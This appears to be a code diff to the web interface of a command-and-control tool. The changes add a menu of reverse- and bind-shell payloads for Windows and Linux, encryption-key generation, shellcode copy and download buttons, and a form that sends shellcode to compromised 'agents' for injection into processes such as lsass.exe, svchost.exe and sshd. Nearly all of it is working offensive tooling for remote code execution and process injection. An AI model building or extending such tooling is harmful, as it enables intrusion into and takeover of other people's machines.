@@ -133,6 +133,39 @@
             </select>
         </div>
 
+        <div class="form-group">
+            <label for="payload">Payload:</label>
+            <select id="payload" onchange="toggleCustomPayload()">
+                <optgroup label="Windows Reverse Shells">
+                    <option value="windows/x64/shell_reverse_tcp">windows/x64/shell_reverse_tcp</option>
+                    <option value="windows/shell/reverse_tcp">windows/shell/reverse_tcp</option>
+                    <option value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</option>
+                    <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
+                    <option value="windows/x64/powershell_reverse_tcp">windows/x64/powershell_reverse_tcp</option>
+                </optgroup>
+                <optgroup label="Linux Reverse Shells">
+                    <option value="linux/x64/shell_reverse_tcp">linux/x64/shell_reverse_tcp</option>
+                    <option value="linux/x86/shell_reverse_tcp">linux/x86/shell_reverse_tcp</option>
+                    <option value="linux/x64/meterpreter/reverse_tcp">linux/x64/meterpreter/reverse_tcp</option>
+                    <option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option>
+                </optgroup>
+                <optgroup label="Windows Bind Shells">
+                    <option value="windows/x64/shell_bind_tcp">windows/x64/shell_bind_tcp</option>
+                    <option value="windows/shell/bind_tcp">windows/shell/bind_tcp</option>
+                    <option value="windows/x64/meterpreter/bind_tcp">windows/x64/meterpreter/bind_tcp</option>
+                    <option value="windows/meterpreter/bind_tcp">windows/meterpreter/bind_tcp</option>
+                </optgroup>
+                <optgroup label="Linux Bind Shells">
+                    <option value="linux/x64/shell_bind_tcp">linux/x64/shell_bind_tcp</option>
+                    <option value="linux/x86/shell_bind_tcp">linux/x86/shell_bind_tcp</option>
+                    <option value="linux/x64/meterpreter/bind_tcp">linux/x64/meterpreter/bind_tcp</option>
+                    <option value="linux/x86/meterpreter/bind_tcp">linux/x86/meterpreter/bind_tcp</option>
+                </optgroup>
+                <option value="custom">Custom Payload</option>
+            </select>
+            <input type="text" id="customPayload" placeholder="e.g. windows/x64/exec CMD=calc.exe" style="display:none;margin-top:5px;">
+        </div>
+
         <div class="form-group" id="hostGroup">
             <label for="host">Host:</label>
             <input type="text" id="host" placeholder="Enter host (e.g. 192.168.1.100)">
@@ -177,20 +210,44 @@
         <div class="form-group" id="keyGroup" style="display: none;">
             <label for="key">Encryption Key:</label>
             <input type="text" id="key" placeholder="Enter encryption key">
+            <button type="button" onclick="generateKey()" style="margin-top:5px;width:auto;">Generate Key</button>
         </div>
 
         <button onclick="generateShellcode()">Generate Shellcode</button>
 
         <div id="result"></div>
 
+        <button type="button" onclick="copyShellcode()" style="margin-top:10px;width:auto;">Copy</button>
+        <button type="button" onclick="downloadShellcode()" style="margin-top:10px;width:auto;">Download</button>
+
         <!-- Inject Shellcode to Agent UI -->
-        <div id="injectForm" style="margin-top:20px; display:none;">
+        <div id="injectForm" style="margin-top:20px;">
             <h3>Inject Shellcode to Agent</h3>
             <form id="injectShellcodeForm">
                 <label for="agent_id">Agent:</label>
                 <select id="agent_id"></select>
                 <label for="process">Target Process:</label>
-                <input type="text" id="process" placeholder="e.g. explorer.exe" required>
+                <select id="process" onchange="customProcessOption()">
+                    <option value="">(Auto-select for OS)</option>
+                    <optgroup label="Windows">
+                        <option value="explorer.exe">explorer.exe</option>
+                        <option value="notepad.exe">notepad.exe</option>
+                        <option value="svchost.exe">svchost.exe</option>
+                        <option value="lsass.exe">lsass.exe</option>
+                        <option value="cmd.exe">cmd.exe</option>
+                        <option value="powershell.exe">powershell.exe</option>
+                    </optgroup>
+                    <optgroup label="Linux">
+                        <option value="bash">bash</option>
+                        <option value="sh">sh</option>
+                        <option value="init">init</option>
+                        <option value="systemd">systemd</option>
+                        <option value="sshd">sshd</option>
+                    </optgroup>
+                    <option value="custom">Other (enter manually)</option>
+                </select>
+                <input type="text" id="customProcess" placeholder="Custom process name" style="display:none;margin-top:5px;" oninput="setCustomProcess()">
+                <label><input type="checkbox" id="startIfNotRunning"> Start process if not running</label>
                 <button type="submit">Send to Agent</button>
             </form>
             <div id="injectResult"></div>
@@ -235,6 +292,38 @@
             keyGroup.style.display = encryption === 'none' ? 'none' : 'block';
         }
 
+        function generateKey(length = 16) {
+            const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let key = '';
+            for (let i = 0; i < length; i++) {
+                key += charset.charAt(Math.floor(Math.random() * charset.length));
+            }
+            document.getElementById('key').value = key;
+        }
+
+        function copyShellcode() {
+            const result = document.getElementById('result');
+            if (result.textContent) {
+                navigator.clipboard.writeText(result.textContent);
+                alert('Shellcode copied to clipboard!');
+            }
+        }
+
+        function downloadShellcode() {
+            const result = document.getElementById('result');
+            if (result.textContent) {
+                const blob = new Blob([result.textContent], {type: 'text/plain'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'shellcode.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+        }
+
         async function generateShellcode() {
             const type = document.getElementById('type').value;
             const host = document.getElementById('host').value;
@@ -244,43 +333,58 @@
             const encoding = document.getElementById('encoding').value;
             const encryption = document.getElementById('encryption').value;
             const key = document.getElementById('key').value;
+            const payload = document.getElementById('payload').value;
+            const customPayload = document.getElementById('customPayload').value;
+
+            // Validate required fields
+            if (type === 'reverse' && (!host || !port)) {
+                alert('Please enter both host and port for reverse shell.');
+                return;
+            }
+            if (type === 'bind' && !port) {
+                alert('Please enter a port for bind shell.');
+                return;
+            }
+            if (type === 'exec' && !command) {
+                alert('Please enter a command to execute.');
+                return;
+            }
+            if ((encryption === 'xor' || encryption === 'aes') && !key) {
+                alert('Please provide an encryption key or generate one.');
+                return;
+            }
 
             const data = {
                 type,
                 platform,
                 encoding,
                 encryption,
-                key
+                key,
+                host,
+                port,
+                command,
+                payload,
+                custom_payload: payload === 'custom' ? customPayload : ''
             };
 
-            if (type === 'reverse') {
-                data.host = host;
-                data.port = parseInt(port);
-            } else if (type === 'bind') {
-                data.port = parseInt(port);
-            } else if (type === 'exec') {
-                data.command = command;
-            }
+            const summary = `\n---\nType: ${type}\nPlatform: ${platform}\nEncoding: ${encoding}\nEncryption: ${encryption}${key ? ` (key: ${key})` : ''}\n${type === 'reverse' ? `Host: ${host}\nPort: ${port}` : ''}${type === 'bind' ? `Port: ${port}` : ''}${type === 'exec' ? `Command: ${command}` : ''}\n---\n`;
 
+            document.getElementById('result').textContent = 'Generating shellcode...';
             try {
                 const response = await fetch('/api/generate_shellcode', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(data)
                 });
-
                 const result = await response.json();
-                
                 if (result.success) {
-                    document.getElementById('result').textContent = result.shellcode;
+                    document.getElementById('result').textContent = summary + (result.shellcode || 'No shellcode generated.');
                     showInjectForm();
                 } else {
-                    document.getElementById('result').textContent = `Error: ${result.error}`;
+                    document.getElementById('result').textContent = 'Error: ' + (result.error || 'Unknown error');
                 }
-            } catch (error) {
-                document.getElementById('result').textContent = `Error: ${error.message}`;
+            } catch (e) {
+                document.getElementById('result').textContent = 'Error: ' + e.message;
             }
         }
 
@@ -289,7 +393,6 @@
         toggleKey();
 
         function showInjectForm() {
-            document.getElementById('injectForm').style.display = 'block';
             loadAgents();
         }
 
@@ -309,7 +412,10 @@
         document.getElementById('injectShellcodeForm').onsubmit = async function(e) {
             e.preventDefault();
             const agent_id = document.getElementById('agent_id').value;
-            const process = document.getElementById('process').value;
+            let process = document.getElementById('process').value;
+            if (process === 'custom') {
+                process = document.getElementById('customProcess').value;
+            }
             const shellcode = document.getElementById('result').innerText.trim();
             const res = await fetch('/api/tasks', {
                 method: 'POST',
@@ -317,12 +423,85 @@
                 body: JSON.stringify({
                     agent_id,
                     module: 'modules.shellcode.inject',
-                    params: { process, shellcode }
+                    params: { process, shellcode, start_if_not_running: document.getElementById('startIfNotRunning').checked }
                 })
             });
             const result = await res.json();
             document.getElementById('injectResult').innerText = result.status === 'success' ? 'Task sent!' : ('Error: ' + (result.error || result.message));
         };
+
+        function customProcessOption() {
+            const processSel = document.getElementById('process');
+            const customInput = document.getElementById('customProcess');
+            if (processSel.value === 'custom') {
+                customInput.style.display = 'block';
+            } else {
+                customInput.style.display = 'none';
+            }
+        }
+
+        function setCustomProcess() {
+            const processSel = document.getElementById('process');
+            const customInput = document.getElementById('customProcess');
+            if (processSel.value === 'custom') {
+                processSel.setAttribute('data-custom', customInput.value);
+            }
+        }
+
+        function toggleCustomPayload() {
+            const payloadSel = document.getElementById('payload');
+            const customInput = document.getElementById('customPayload');
+            if (payloadSel.value === 'custom') {
+                customInput.style.display = 'block';
+            } else {
+                customInput.style.display = 'none';
+            }
+        }
+
+        // Add this JS function to filter payloads
+        function filterPayloads() {
+            const type = document.getElementById('type').value;
+            const platform = document.getElementById('platform').value;
+            const payloadSel = document.getElementById('payload');
+            for (const optgroup of payloadSel.getElementsByTagName('optgroup')) {
+                let show = false;
+                if (type === 'reverse' && optgroup.label.toLowerCase().includes('reverse')) {
+                    show = optgroup.label.toLowerCase().includes(platform);
+                } else if (type === 'bind' && optgroup.label.toLowerCase().includes('bind')) {
+                    show = optgroup.label.toLowerCase().includes(platform);
+                } else if (type === 'exec') {
+                    show = false; // Hide all shell payloads for exec
+                }
+                optgroup.style.display = show ? '' : 'none';
+            }
+            // Always show the custom payload option
+            for (const option of payloadSel.options) {
+                if (option.value === 'custom') option.style.display = '';
+            }
+            // If exec, select custom by default
+            if (type === 'exec') {
+                payloadSel.value = 'custom';
+                toggleCustomPayload();
+            } else {
+                // If current selection is hidden, select the first visible
+                if (payloadSel.selectedOptions.length && payloadSel.selectedOptions[0].style.display === 'none') {
+                    for (const optgroup of payloadSel.getElementsByTagName('optgroup')) {
+                        if (optgroup.style.display !== 'none' && optgroup.children.length) {
+                            payloadSel.value = optgroup.children[0].value;
+                            break;
+                        }
+                    }
+                }
+                toggleCustomPayload();
+            }
+        }
+
+        // Call filterPayloads() on type/platform change
+        // In updateForm() and on platform select's onchange, add:
+        document.getElementById('type').addEventListener('change', filterPayloads);
+        document.getElementById('platform').addEventListener('change', filterPayloads);
+        // Call once on page load
+        filterPayloads();
     </script>
 </body>
 </html>
